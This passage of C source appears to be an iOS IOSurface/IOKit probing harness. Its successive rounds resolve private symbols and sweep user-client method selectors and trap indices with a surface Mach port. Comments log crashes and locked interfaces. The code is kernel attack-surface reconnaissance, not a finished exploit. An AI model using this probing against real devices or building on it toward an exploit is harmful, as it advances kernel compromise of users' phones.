            "IOSurfaceClientSetProtectionOptions",
            "IOSurfaceSetGenerationCount", "IOSurfaceGetGenerationCount",
            "IOSurfaceSetResidentCount", "IOSurfaceGetResidentCount",
            NULL
        };
        for (int i = 0; syms[i]; i++) {
            void *p = dlsym(iosfc, syms[i]);
            if (p) rlog("    FOUND: %s = %p\n", syms[i], p);
        }
        fflush(stdout);
    }

    if (iosfc) dlclose(iosfc);
    if (iokit) dlclose(iokit);
    mach_port_deallocate(mach_task_self(), sp);
    __sync_fetch_and_add(&r271_probed, 1);
    rlog("\n*** r271 probe complete ***\n");
    fflush(stdout);
}

/* r270: IOSurfaceClient* APIs + SetCFProperty + ExclusiveAccess investigation.
 * r269 found: SetCFProperties returns kIOReturnExclusiveAccess (0xe00002e2)
 *   — kernel setProperties() IS IMPLEMENTED but locked.
 * Also found: IOSurfaceClientCreate/Release/Lookup/Lock exist.
 * Also: IOSurfaceCopyDataValueBytes, IOSurfaceFlushProcessorCaches.
 * This round explores these new API surfaces. */
static volatile int r270_probed = 0;

static void r270_probe(IOSurfaceRef surf) {
    uint32_t sid = IOSurfaceGetID(surf);
    kern_return_t kr;

    rlog("\n=== r270: IOSurfaceClient APIs + SetCFProperty + ExclusiveAccess ===\n");
    fflush(stdout);

    mach_port_t sp = IOSurfaceCreateMachPort(surf);
    rlog("  surfMachPort=%u surfID=%u\n", sp, sid);
    fflush(stdout);

    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
        IOServiceMatching("IOSurfaceRoot"));
    io_connect_t conn = IO_OBJECT_NULL;
    IOServiceOpen(svc, mach_task_self(), 0, &conn);
    rlog("  conn=%u\n", conn);
    fflush(stdout);

    void *iosfc = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);

    /* Part 1: IOSurfaceClientCreate/Lookup/Lock */
    rlog("\n  --- Part 1: IOSurfaceClient APIs ---\n"); fflush(stdout);
    {
        typedef void* (*clientcreate_t)(uint32_t);
        typedef void (*clientrelease_t)(void*);
        typedef void* (*clientlookup_t)(uint32_t);
        typedef kern_return_t (*clientlock_t)(void*, uint32_t, uint32_t*);

        clientcreate_t clientCreate = (clientcreate_t)dlsym(iosfc, "IOSurfaceClientCreate");
        clientrelease_t clientRelease = (clientrelease_t)dlsym(iosfc, "IOSurfaceClientRelease");
        clientlookup_t clientLookup = (clientlookup_t)dlsym(iosfc, "IOSurfaceClientLookup");
        clientlock_t clientLock = (clientlock_t)dlsym(iosfc, "IOSurfaceClientLock");

        rlog("    ClientCreate=%p ClientRelease=%p ClientLookup=%p ClientLock=%p\n",
            clientCreate, clientRelease, clientLookup, clientLock);
        fflush(stdout);

        /* IOSurfaceClientCreate likely takes (task, surfaceID) or (connection, surfaceID)
         * — calling with wrong signature crashes due to PAC or bad args.
         * Try IOSurfaceClientLookup first (safer — just a lookup). */
        if (clientLookup) {
            rlog("    Trying ClientLookup(%u)...\n", sid); fflush(stdout);
            void *client2 = clientLookup(sid);
            rlog("    ClientLookup(%u) = %p\n", sid, client2);
            fflush(stdout);
            if (client2 && clientRelease) {
                clientRelease(client2);
                rlog("    ClientRelease done\n"); fflush(stdout);
            }
        }

        /* ClientCreate crashes — skip it. Focus on what client from Lookup can do. */
        if (clientLookup && clientLock) {
            void *client3 = clientLookup(sid);
            if (client3) {
                rlog("    ClientLookup(%u) for lock test = %p\n", sid, client3);
                fflush(stdout);

                /* Try different lock types */
                uint32_t seed = 0;
                kr = clientLock(client3, 0, &seed);
                rlog("    ClientLock(client, 0, &seed): kr=0x%x seed=%u\n", kr, seed);
                fflush(stdout);

                kr = clientLock(client3, 1, &seed);
                rlog("    ClientLock(client, 1, &seed): kr=0x%x seed=%u\n", kr, seed);
                fflush(stdout);

                kr = clientLock(client3, 2, &seed);
                rlog("    ClientLock(client, 2, &seed): kr=0x%x seed=%u\n", kr, seed);
                fflush(stdout);

                if (clientRelease) clientRelease(client3);
            }
        }
    }

    /* Part 2: IOSurfaceCopyDataValueBytes — might take (surf, key, buf, len) */
    rlog("\n  --- Part 2: IOSurfaceCopyDataValueBytes ---\n"); fflush(stdout);
    {
        /* Try alternative signature: kern_return_t (IOSurfaceRef, CFStringRef, void*, size_t*) */
        typedef kern_return_t (*copydatabytes2_t)(IOSurfaceRef, CFStringRef, void*, size_t*);
        copydatabytes2_t copyDB2 = (copydatabytes2_t)dlsym(iosfc, "IOSurfaceCopyDataValueBytes");
        if (copyDB2) {
            char buf[256];
            size_t len = sizeof(buf);
            memset(buf, 0, sizeof(buf));
            kr = copyDB2(surf, CFSTR("IOSurfaceAllocSize"), buf, &len);
            rlog("    CopyDataValueBytes(IOSurfaceAllocSize, buf, 256): kr=0x%x len=%zu\n", kr, len);
            if (kr == 0 && len > 0 && len <= 16) {
                rlog("      bytes:");
                for (size_t i = 0; i < len; i++) rlog(" %02x", (unsigned char)buf[i]);
                rlog("\n");
            }
            fflush(stdout);

            /* Try with a custom key we set via IOSurfaceSetValue */
            int testval = 0xDEADBEEF;
            CFNumberRef tv = CFNumberCreate(NULL, kCFNumberIntType, &testval);
            IOSurfaceSetValue(surf, CFSTR("test_key"), tv);
            CFRelease(tv);

            len = sizeof(buf);
            kr = copyDB2(surf, CFSTR("test_key"), buf, &len);
            rlog("    CopyDataValueBytes(test_key): kr=0x%x len=%zu\n", kr, len);
            if (kr == 0 && len > 0 && len <= 16) {
                rlog("      bytes:");
                for (size_t i = 0; i < len; i++) rlog(" %02x", (unsigned char)buf[i]);
                rlog("\n");
            }
            fflush(stdout);
        }

        /* SetDataValueBytes */
        typedef kern_return_t (*setdatabytes_t)(IOSurfaceRef, CFStringRef, const void*, size_t);
        setdatabytes_t setDB = (setdatabytes_t)dlsym(iosfc, "IOSurfaceSetDataValueBytes");
        if (setDB) {
            rlog("    FOUND: IOSurfaceSetDataValueBytes = %p\n", setDB);
            uint32_t testdata = 0x41414141;
            kr = setDB(surf, CFSTR("raw_test"), &testdata, sizeof(testdata));
            rlog("    SetDataValueBytes(raw_test, 4 bytes): kr=0x%x\n", kr);
            fflush(stdout);
        }
    }

    /* Part 3: IOSurfaceCopyAllValues + manipulation */
    rlog("\n  --- Part 3: IOSurfaceCopyAllValues ---\n"); fflush(stdout);
    {
        typedef CFDictionaryRef (*copyall_t)(IOSurfaceRef);
        typedef void (*removeall_t)(IOSurfaceRef);
        copyall_t copyAll = (copyall_t)dlsym(iosfc, "IOSurfaceCopyAllValues");
        removeall_t removeAll = (removeall_t)dlsym(iosfc, "IOSurfaceRemoveAllValues");

        if (copyAll) {
            CFDictionaryRef all = copyAll(surf);
            rlog("    CopyAllValues = %p", all);
            if (all) {
                rlog(" count=%ld", CFDictionaryGetCount(all));
                CFRelease(all);
            }
            rlog("\n"); fflush(stdout);
        }
    }

    /* Part 4: IOConnectSetCFProperty (single property) — maybe different access? */
    rlog("\n  --- Part 4: IOConnectSetCFProperty (single) ---\n"); fflush(stdout);
    {
        typedef kern_return_t (*setcfprop_t)(io_connect_t, CFStringRef, CFTypeRef);
        setcfprop_t setCFProp = (setcfprop_t)dlsym(iokit, "IOConnectSetCFProperty");
        if (setCFProp) {
            CFNumberRef sidNum = CFNumberCreate(NULL, kCFNumberIntType, &sid);
            kr = setCFProp(conn, CFSTR("IOSurfaceID"), sidNum);
            rlog("    SetCFProperty(IOSurfaceID, %u): 0x%x\n", sid, kr); fflush(stdout);
            CFRelease(sidNum);

            int spInt = (int)sp;
            CFNumberRef spNum = CFNumberCreate(NULL, kCFNumberIntType, &spInt);
            kr = setCFProp(conn, CFSTR("IOSurfacePort"), spNum);
            rlog("    SetCFProperty(IOSurfacePort, %u): 0x%x\n", sp, kr); fflush(stdout);
            CFRelease(spNum);

            int cmd = 1;
            CFNumberRef cmdNum = CFNumberCreate(NULL, kCFNumberIntType, &cmd);
            kr = setCFProp(conn, CFSTR("IOSurfaceReleaseID"), cmdNum);
            rlog("    SetCFProperty(IOSurfaceReleaseID, 1): 0x%x\n", kr); fflush(stdout);
            CFRelease(cmdNum);

            CFNumberRef sidNum2 = CFNumberCreate(NULL, kCFNumberIntType, &sid);
            kr = setCFProp(conn, CFSTR("IOSurfaceLookupID"), sidNum2);
            rlog("    SetCFProperty(IOSurfaceLookupID, %u): 0x%x\n", sid, kr); fflush(stdout);
            CFRelease(sidNum2);
        }
    }

    /* Part 5: IOSurfaceFlushProcessorCaches */
    rlog("\n  --- Part 5: IOSurfaceFlushProcessorCaches ---\n"); fflush(stdout);
    {
        typedef kern_return_t (*flushcaches_t)(IOSurfaceRef);
        flushcaches_t flushCaches = (flushcaches_t)dlsym(iosfc, "IOSurfaceFlushProcessorCaches");
        if (flushCaches) {
            kr = flushCaches(surf);
            rlog("    FlushProcessorCaches: 0x%x\n", kr); fflush(stdout);
        }
    }

    /* Part 6: IORegistryEntryGetProperty on IOSurfaceRoot service */
    rlog("\n  --- Part 6: IORegistry property read ---\n"); fflush(stdout);
    {
        typedef kern_return_t (*reggetprop_t)(io_registry_entry_t, const char*, char*, uint32_t*);
        reggetprop_t regGetProp = (reggetprop_t)dlsym(iokit, "IORegistryEntryGetProperty");

        CFMutableDictionaryRef svcProps = NULL;
        kr = IORegistryEntryCreateCFProperties(svc, &svcProps, kCFAllocatorDefault, 0);
        rlog("    IORegistryEntryCreateCFProperties(svc): 0x%x", kr);
        if (svcProps) {
            rlog(" count=%ld", CFDictionaryGetCount(svcProps));
            /* Log some key names */
            CFIndex cnt = CFDictionaryGetCount(svcProps);
            if (cnt > 0 && cnt < 50) {
                const void **keys = (const void**)malloc(sizeof(void*) * cnt);
                CFDictionaryGetKeysAndValues(svcProps, keys, NULL);
                for (CFIndex i = 0; i < cnt && i < 10; i++) {
                    char buf[128] = {0};
                    CFStringGetCString((CFStringRef)keys[i], buf, sizeof(buf), kCFStringEncodingUTF8);
                    rlog("\n      key[%ld]: %s", i, buf);
                }
                free(keys);
            }
            CFRelease(svcProps);
        }
        rlog("\n"); fflush(stdout);

        /* Also check the connection's properties */
        io_service_t connSvc = IO_OBJECT_NULL;
        kr = IOConnectGetService(conn, &connSvc);
        rlog("    IOConnectGetService(conn): 0x%x svc=%u\n", kr, connSvc);
        fflush(stdout);
        if (connSvc) IOObjectRelease(connSvc);
    }

    /* Part 7: Scan more IOSurface private symbols */
    rlog("\n  --- Part 7: Extended symbol scan ---\n"); fflush(stdout);
    {
        const char *more_syms[] = {
            "IOSurfaceBindAccelerator", "IOSurfaceUnbindAccelerator",
            "IOSurfaceGetSeed", "IOSurfaceSetOwnership",
            "IOSurfaceGetBulkAttachments", "IOSurfaceSetBulkAttachments",
            "_IOSurfaceRootConnect", "_IOSurfaceRootDisconnect",
            "IOSurfaceNotificationCreate", "IOSurfaceNotificationGetRunLoopSource",
            "_IOSurfaceGetConnection", "_IOSurfaceMachPortSend",
            "IOSurfaceAlignProperty", "IOSurfaceGetPropertyAlignment",
            "IOSurfaceGetPropertyMaximum", "IOSurfaceGetSubsampling",
            "IOSurfaceSetPurgeWhenNotInUse",
            NULL
        };
        for (int i = 0; more_syms[i]; i++) {
            void *p = dlsym(iosfc, more_syms[i]);
            if (p) rlog("    FOUND: %s = %p\n", more_syms[i], p);
        }
        fflush(stdout);
    }

    if (iosfc) dlclose(iosfc);
    if (iokit) dlclose(iokit);
    IOServiceClose(conn);
    IOObjectRelease(svc);
    mach_port_deallocate(mach_task_self(), sp);
    __sync_fetch_and_add(&r270_probed, 1);
    rlog("\n*** r270 probe complete ***\n");
    fflush(stdout);
}

/* r269: IOConnectCallMethod with port descriptors + io_connect_method raw MIG.
 * r268 confirmed: ALL trap indices return BadArgument with surfMachPort as arg.
 * mach_msg to IOSurface port = EXC_GUARD (guarded port, app killed).
 * New approach: use IOConnectCallMethod selectors 6/7 with structured input
 * containing the surface Mach port, and try raw io_connect_method MIG calls
 * with OOL port descriptors to pass the port properly. */
static volatile int r269_probed = 0;

static void r269_probe(IOSurfaceRef surf) {
    uint32_t sid = IOSurfaceGetID(surf);
    kern_return_t kr;

    rlog("\n=== r269: IOConnectCallMethod + io_connect_method with port descriptors ===\n");
    fflush(stdout);

    mach_port_t sp = IOSurfaceCreateMachPort(surf);
    rlog("  surfMachPort=%u surfID=%u\n", sp, sid);
    fflush(stdout);

    mach_port_t np = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &np);
    mach_port_insert_right(mach_task_self(), np, np, MACH_MSG_TYPE_MAKE_SEND);

    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
        IOServiceMatching("IOSurfaceRoot"));
    io_connect_t conn = IO_OBJECT_NULL;
    IOServiceOpen(svc, mach_task_self(), 0, &conn);
    rlog("  conn=%u\n", conn);
    fflush(stdout);

    /* Part 1: IOConnectCallMethod with scalar inputs containing port name */
    rlog("\n  --- Part 1: IOConnectCallMethod sel 6/7 with port as scalar ---\n"); fflush(stdout);
    {
        uint64_t input[6];
        uint32_t outCnt = 0;

        /* sel 6 with just the port */
        input[0] = sp;
        kr = IOConnectCallMethod(conn, 6, input, 1, NULL, 0, NULL, &outCnt, NULL, NULL);
        rlog("    CallMethod(6, [sp]): 0x%x\n", kr); fflush(stdout);

        input[0] = sp; input[1] = 0;
        kr = IOConnectCallMethod(conn, 6, input, 2, NULL, 0, NULL, &outCnt, NULL, NULL);
        rlog("    CallMethod(6, [sp,0]): 0x%x\n", kr); fflush(stdout);

        input[0] = sp; input[1] = sid;
        kr = IOConnectCallMethod(conn, 6, input, 2, NULL, 0, NULL, &outCnt, NULL, NULL);
        rlog("    CallMethod(6, [sp,sID]): 0x%x\n", kr); fflush(stdout);

        input[0] = sp; input[1] = np;
        kr = IOConnectCallMethod(conn, 6, input, 2, NULL, 0, NULL, &outCnt, NULL, NULL);
        rlog("    CallMethod(6, [sp,np]): 0x%x\n", kr); fflush(stdout);

        input[0] = sp; input[1] = 0; input[2] = 0;
        kr = IOConnectCallMethod(conn, 6, input, 3, NULL, 0, NULL, &outCnt, NULL, NULL);
        rlog("    CallMethod(6, [sp,0,0]): 0x%x\n", kr); fflush(stdout);

        input[0] = sp; input[1] = sid; input[2] = np;
        kr = IOConnectCallMethod(conn, 6, input, 3, NULL, 0, NULL, &outCnt, NULL, NULL);
        rlog("    CallMethod(6, [sp,sID,np]): 0x%x\n", kr); fflush(stdout);

        /* Try with struct input: pack port name as bytes */
        uint32_t struct_in[4];
        struct_in[0] = sp;
        struct_in[1] = 0;
        kr = IOConnectCallMethod(conn, 6, NULL, 0, struct_in, sizeof(uint32_t)*1, NULL, &outCnt, NULL, NULL);
        rlog("    CallMethod(6, struct=[sp]): 0x%x\n", kr); fflush(stdout);

        kr = IOConnectCallMethod(conn, 6, NULL, 0, struct_in, sizeof(uint32_t)*2, NULL, &outCnt, NULL, NULL);
        rlog("    CallMethod(6, struct=[sp,0]): 0x%x\n", kr); fflush(stdout);

        struct_in[0] = sp; struct_in[1] = sid;
        kr = IOConnectCallMethod(conn, 6, NULL, 0, struct_in, sizeof(uint32_t)*2, NULL, &outCnt, NULL, NULL);
        rlog("    CallMethod(6, struct=[sp,sID]): 0x%x\n", kr); fflush(stdout);

        /* Mixed: scalars + struct */
        input[0] = sp;
        struct_in[0] = sid;
        kr = IOConnectCallMethod(conn, 6, input, 1, struct_in, sizeof(uint32_t), NULL, &outCnt, NULL, NULL);
        rlog("    CallMethod(6, scalar=[sp], struct=[sID]): 0x%x\n", kr); fflush(stdout);

        input[0] = sid;
        struct_in[0] = sp;
        kr = IOConnectCallMethod(conn, 6, input, 1, struct_in, sizeof(uint32_t), NULL, &outCnt, NULL, NULL);
        rlog("    CallMethod(6, scalar=[sID], struct=[sp]): 0x%x\n", kr); fflush(stdout);

        /* sel 7 same patterns */
        input[0] = sp;
        kr = IOConnectCallMethod(conn, 7, input, 1, NULL, 0, NULL, &outCnt, NULL, NULL);
        rlog("    CallMethod(7, [sp]): 0x%x\n", kr); fflush(stdout);

        input[0] = sp; input[1] = 0;
        kr = IOConnectCallMethod(conn, 7, input, 2, NULL, 0, NULL, &outCnt, NULL, NULL);
        rlog("    CallMethod(7, [sp,0]): 0x%x\n", kr); fflush(stdout);

        input[0] = sp; input[1] = sid;
        kr = IOConnectCallMethod(conn, 7, input, 2, NULL, 0, NULL, &outCnt, NULL, NULL);
        rlog("    CallMethod(7, [sp,sID]): 0x%x\n", kr); fflush(stdout);

        kr = IOConnectCallMethod(conn, 7, NULL, 0, struct_in, sizeof(uint32_t), NULL, &outCnt, NULL, NULL);
        rlog("    CallMethod(7, struct=[sp]): 0x%x\n", kr); fflush(stdout);
    }

    /* Part 2: IOConnectCallScalarMethod with output */
    rlog("\n  --- Part 2: IOConnectCallMethod sel 6/7 with outputs ---\n"); fflush(stdout);
    {
        uint64_t input[2], output[16];
        uint32_t outCnt;
        char struct_out[256];
        size_t struct_out_sz;

        /* Try getting scalar output */
        input[0] = sp;
        outCnt = 16;
        kr = IOConnectCallMethod(conn, 6, input, 1, NULL, 0, output, &outCnt, NULL, NULL);
        rlog("    CallMethod(6, [sp], out_cnt=%u): 0x%x\n", outCnt, kr); fflush(stdout);

        /* Try getting struct output */
        input[0] = sp;
        struct_out_sz = 256;
        kr = IOConnectCallMethod(conn, 6, input, 1, NULL, 0, NULL, NULL, struct_out, &struct_out_sz);
        rlog("    CallMethod(6, [sp], struct_out_sz=%zu): 0x%x\n", struct_out_sz, kr); fflush(stdout);

        /* Try with no inputs at all, just selector 6/7 */
        outCnt = 16;
        kr = IOConnectCallMethod(conn, 6, NULL, 0, NULL, 0, output, &outCnt, NULL, NULL);
        rlog("    CallMethod(6, no_input, out_cnt=%u): 0x%x\n", outCnt, kr); fflush(stdout);

        outCnt = 16;
        kr = IOConnectCallMethod(conn, 7, NULL, 0, NULL, 0, output, &outCnt, NULL, NULL);
        rlog("    CallMethod(7, no_input, out_cnt=%u): 0x%x\n", outCnt, kr); fflush(stdout);

        /* Try selectors we haven't tried with CallMethod */
        for (int sel = 0; sel <= 30; sel++) {
            input[0] = sp;
            outCnt = 16;
            struct_out_sz = 256;
            kr = IOConnectCallMethod(conn, sel, input, 1, NULL, 0, output, &outCnt, struct_out, &struct_out_sz);
            if (kr != 0xe00002c2) {
                rlog("    CallMethod(%d, [sp]): 0x%x outCnt=%u structSz=%zu\n", sel, kr, outCnt, struct_out_sz);
                fflush(stdout);
            }
        }
        rlog("    (all BadArgument sels omitted)\n"); fflush(stdout);
    }

    /* Part 3: IOConnectCallAsyncMethod — passes a wake port for async notification */
    rlog("\n  --- Part 3: IOConnectCallAsyncMethod sel 6/7 ---\n"); fflush(stdout);
    {
        uint64_t input[2];
        uint64_t ref[8];
        ref[0] = 0x41414141;

        /* Create a wake port for async */
        mach_port_t wake = MACH_PORT_NULL;
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wake);
        mach_port_insert_right(mach_task_self(), wake, wake, MACH_MSG_TYPE_MAKE_SEND);

        input[0] = sp;
        kr = IOConnectCallAsyncMethod(conn, 6, wake, ref, 1, input, 1, NULL, 0, NULL, NULL, NULL, NULL);
        rlog("    AsyncMethod(6, wake, [sp]): 0x%x\n", kr); fflush(stdout);

        input[0] = sp; input[1] = sid;
        kr = IOConnectCallAsyncMethod(conn, 6, wake, ref, 1, input, 2, NULL, 0, NULL, NULL, NULL, NULL);
        rlog("    AsyncMethod(6, wake, [sp,sID]): 0x%x\n", kr); fflush(stdout);

        input[0] = sp;
        kr = IOConnectCallAsyncMethod(conn, 7, wake, ref, 1, input, 1, NULL, 0, NULL, NULL, NULL, NULL);
        rlog("    AsyncMethod(7, wake, [sp]): 0x%x\n", kr); fflush(stdout);

        /* Try all selectors with async */
        for (int sel = 0; sel <= 30; sel++) {
            input[0] = sp;
            kr = IOConnectCallAsyncMethod(conn, sel, wake, ref, 1, input, 1, NULL, 0, NULL, NULL, NULL, NULL);
            if (kr != 0xe00002c2) {
                rlog("    AsyncMethod(%d, wake, [sp]): 0x%x\n", sel, kr);
                fflush(stdout);
            }
        }
        rlog("    (all BadArgument async sels omitted)\n"); fflush(stdout);

        mach_port_deallocate(mach_task_self(), wake);
    }

    /* Part 4: Try a SECOND IOSurface connection — maybe selector behaviors differ */
    rlog("\n  --- Part 4: Second IOSurfaceRoot connection ---\n"); fflush(stdout);
    {
        io_connect_t conn2 = IO_OBJECT_NULL;
        IOServiceOpen(svc, mach_task_self(), 0, &conn2);
        rlog("    conn2=%u\n", conn2);

        /* IOConnectAddClient: connect conn2 to conn */
        void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
        typedef kern_return_t (*addclient_t)(io_connect_t, io_connect_t);
        addclient_t addClient = (addclient_t)dlsym(iokit, "IOConnectAddClient");
        if (addClient) {
            kr = addClient(conn, conn2);
            rlog("    IOConnectAddClient(conn, conn2): 0x%x\n", kr); fflush(stdout);
            kr = addClient(conn2, conn);
            rlog("    IOConnectAddClient(conn2, conn): 0x%x\n", kr); fflush(stdout);
        }
        if (iokit) dlclose(iokit);

        if (conn2) IOServiceClose(conn2);
    }

    /* Part 5: Private symbol probe (from r268 — never ran due to crash) */
    rlog("\n  --- Part 5: Private IOSurface/IOKit symbols ---\n"); fflush(stdout);
    {
        void *iosfc = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
        if (iosfc) {
            const char *syms[] = {
                "IOSurfaceCopyAllValues", "IOSurfaceRemoveAllValues",
                "IOSurfaceClientCreate", "IOSurfaceClientRelease",
                "IOSurfaceClientLookup", "IOSurfaceClientLock",
                "IOSurfaceSendRight", "IOSurfacePortForID",
                "_IOSurfaceNotifyValues", "_IOSurfaceSetNotify",
                "_IOSurfaceRemoveNotify", "_IOSurfaceSendMessage",
                "_IOSurfaceGetMachPort", "_IOSurfaceXPCSetValue",
                "IOSurfacePropertyModify", "IOSurfacePropertyListModify",
                "IOSurfaceBindAccelerator", "IOSurfaceFlushProcessorCaches",
                "IOSurfaceCopyDataValueBytes", "IOSurfaceSetDataValueBytes",
                "_IOSurfaceRootUserClient_create_surface",
                "_IOSurfaceRootUserClient_release_surface",
                "_IOSurfaceRootUserClient_lookup_surface",
                NULL
            };
            for (int i = 0; syms[i]; i++) {
                void *p = dlsym(iosfc, syms[i]);
                if (p) rlog("    FOUND: %s = %p\n", syms[i], p);
            }
            fflush(stdout);
            dlclose(iosfc);
        }
        void *iokitfw = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
        if (iokitfw) {
            const char *iokit_syms[] = {
                "IOConnectTrap3", "IOConnectTrap4", "IOConnectTrap5",
                "IOConnectAddClient", "io_connect_method",
                "IOConnectCallStructMethod", "IOConnectCallScalarMethod",
                "IOConnectSetCFProperties", "IOConnectSetCFProperty",
                "IORegistryEntryGetProperty",
                NULL
            };
            for (int i = 0; iokit_syms[i]; i++) {
                void *p = dlsym(iokitfw, iokit_syms[i]);
                if (p) rlog("    IOKit: %s = %p\n", iokit_syms[i], p);
            }
            fflush(stdout);
            dlclose(iokitfw);
        }
    }

    /* Part 6: IOConnectSetCFProperties via dlsym (unavailable on iOS headers) */
    rlog("\n  --- Part 6: IOConnectSetCFProperties via dlsym ---\n"); fflush(stdout);
    {
        void *iokit2 = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
        typedef kern_return_t (*setcfprops_t)(io_connect_t, CFTypeRef);
        setcfprops_t setCFProps = NULL;
        if (iokit2) setCFProps = (setcfprops_t)dlsym(iokit2, "IOConnectSetCFProperties");
        if (setCFProps) {
            CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFNumberRef sidNum = CFNumberCreate(NULL, kCFNumberIntType, &sid);
            CFDictionarySetValue(dict, CFSTR("IOSurfaceID"), sidNum);
            kr = setCFProps(conn, dict);
            rlog("    SetCFProperties({IOSurfaceID: %u}): 0x%x\n", sid, kr); fflush(stdout);
            CFRelease(sidNum);
            CFRelease(dict);

            dict = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            int spInt = (int)sp;
            CFNumberRef spNum = CFNumberCreate(NULL, kCFNumberIntType, &spInt);
            CFDictionarySetValue(dict, CFSTR("IOSurfacePort"), spNum);
            kr = setCFProps(conn, dict);
            rlog("    SetCFProperties({IOSurfacePort: %u}): 0x%x\n", sp, kr); fflush(stdout);
            CFRelease(spNum);
            CFRelease(dict);
        } else {
            rlog("    IOConnectSetCFProperties not found via dlsym\n"); fflush(stdout);
        }
        if (iokit2) dlclose(iokit2);
    }

    IOServiceClose(conn);
    IOObjectRelease(svc);
    mach_port_deallocate(mach_task_self(), sp);
    mach_port_deallocate(mach_task_self(), np);
    __sync_fetch_and_add(&r269_probed, 1);
    rlog("\n*** r269 probe complete ***\n");
    fflush(stdout);
}

/* r268: Targeted trap 6/7 with surfMachPort as first arg + safe mach_msg probe.
 * r266 showed trap returns BadArgument when surfMachPort is first arg (proving
 * the trap validates it as an IOSurface port), IPCError for all other ports.
 * r267 showed mach_msg to the port crashes/kills the app.
 * This round: exhaustive trap 6/7 arg sweep with surfMachPort at arg[0],
 * plus careful mach_msg with fflush after each attempt. */
static volatile int r268_probed = 0;

static void r268_probe(IOSurfaceRef surf) {
    uint32_t sid = IOSurfaceGetID(surf);
    kern_return_t kr;

    rlog("\n=== r268: Trap 6/7 with surfMachPort as first arg ===\n");
    fflush(stdout);

    mach_port_t sp = IOSurfaceCreateMachPort(surf);
    rlog("  surfMachPort=%u surfID=%u\n", sp, sid);
    fflush(stdout);

    /* Create notification port */
    mach_port_t np = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &np);
    mach_port_insert_right(mach_task_self(), np, np, MACH_MSG_TYPE_MAKE_SEND);

    /* Open IOSurfaceRoot connection */
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
        IOServiceMatching("IOSurfaceRoot"));
    io_connect_t conn = IO_OBJECT_NULL;
    IOServiceOpen(svc, mach_task_self(), 0, &conn);
    rlog("  conn=%u\n", conn);
    fflush(stdout);

    /* Load all trap functions */
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    typedef kern_return_t (*trap0_t)(io_connect_t, uint32_t);
    typedef kern_return_t (*trap1_t)(io_connect_t, uint32_t, uintptr_t);
    typedef kern_return_t (*trap2_t)(io_connect_t, uint32_t, uintptr_t, uintptr_t);
    typedef kern_return_t (*trap3_t)(io_connect_t, uint32_t, uintptr_t, uintptr_t, uintptr_t);
    typedef kern_return_t (*trap4_t)(io_connect_t, uint32_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t);
    typedef kern_return_t (*trap5_t)(io_connect_t, uint32_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t);
    typedef kern_return_t (*trap6_t)(io_connect_t, uint32_t, uintptr_t, uintptr_t,
        uintptr_t, uintptr_t, uintptr_t, uintptr_t);

    trap1_t t1 = (trap1_t)dlsym(iokit, "IOConnectTrap1");
    trap2_t t2 = (trap2_t)dlsym(iokit, "IOConnectTrap2");
    trap3_t t3 = (trap3_t)dlsym(iokit, "IOConnectTrap3");
    trap4_t t4 = (trap4_t)dlsym(iokit, "IOConnectTrap4");
    trap5_t t5 = (trap5_t)dlsym(iokit, "IOConnectTrap5");
    trap6_t t6 = (trap6_t)dlsym(iokit, "IOConnectTrap6");

    /* ========== Trap idx=6 with surfMachPort as FIRST arg ========== */
    rlog("\n  --- Trap 6: surfMachPort as first arg ---\n"); fflush(stdout);

    /* T1: just the port */
    kr = t1(conn, 6, (uintptr_t)sp);
    rlog("    T1(6, sp): 0x%x\n", kr); fflush(stdout);

    /* T2: port + various second args */
    kr = t2(conn, 6, (uintptr_t)sp, 0); rlog("    T2(6, sp, 0): 0x%x\n", kr); fflush(stdout);
    kr = t2(conn, 6, (uintptr_t)sp, 1); rlog("    T2(6, sp, 1): 0x%x\n", kr); fflush(stdout);
    kr = t2(conn, 6, (uintptr_t)sp, sid); rlog("    T2(6, sp, sID): 0x%x\n", kr); fflush(stdout);
    kr = t2(conn, 6, (uintptr_t)sp, (uintptr_t)np); rlog("    T2(6, sp, np): 0x%x\n", kr); fflush(stdout);

    /* T3: port + two more args */
    kr = t3(conn, 6, (uintptr_t)sp, 0, 0); rlog("    T3(6, sp, 0, 0): 0x%x\n", kr); fflush(stdout);
    kr = t3(conn, 6, (uintptr_t)sp, sid, 0); rlog("    T3(6, sp, sID, 0): 0x%x\n", kr); fflush(stdout);
    kr = t3(conn, 6, (uintptr_t)sp, 0, sid); rlog("    T3(6, sp, 0, sID): 0x%x\n", kr); fflush(stdout);
    kr = t3(conn, 6, (uintptr_t)sp, 1, 0); rlog("    T3(6, sp, 1, 0): 0x%x\n", kr); fflush(stdout);
    kr = t3(conn, 6, (uintptr_t)sp, (uintptr_t)np, 0); rlog("    T3(6, sp, np, 0): 0x%x\n", kr); fflush(stdout);
    kr = t3(conn, 6, (uintptr_t)sp, (uintptr_t)np, sid); rlog("    T3(6, sp, np, sID): 0x%x\n", kr); fflush(stdout);

    /* T4: port + three more */
    kr = t4(conn, 6, (uintptr_t)sp, 0, 0, 0); rlog("    T4(6, sp, 0,0,0): 0x%x\n", kr); fflush(stdout);
    kr = t4(conn, 6, (uintptr_t)sp, sid, 0, 0); rlog("    T4(6, sp, sID,0,0): 0x%x\n", kr); fflush(stdout);
